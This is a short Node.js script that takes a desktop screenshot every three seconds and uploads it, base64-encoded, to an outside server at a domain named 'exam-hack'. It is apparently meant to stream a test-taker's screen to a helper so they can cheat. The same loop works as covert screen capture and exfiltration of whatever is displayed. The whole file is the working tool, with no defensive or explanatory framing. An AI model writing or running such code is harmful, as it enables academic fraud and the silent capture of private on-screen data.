const screenshot = require('screenshot-desktop');
const axios = require('axios').default;

setInterval(() => {
    console.log('building screen image....');
    (async () => {
        const buffer = await screenshot();
        try {
            console.log('sending data to client....');
            const response = await axios({
                method: "POST",
                url: 'http://exam-hack.bytecodes.club/upload-img',
                data: {
                    "data": buffer.toString('base64'),
                }
            });
            if (response.status == 200) console.log('image sended to client');
            else console.log('something went wrong');
        } catch (error) {
            console.log(error.message);
        }
    })();
},3000);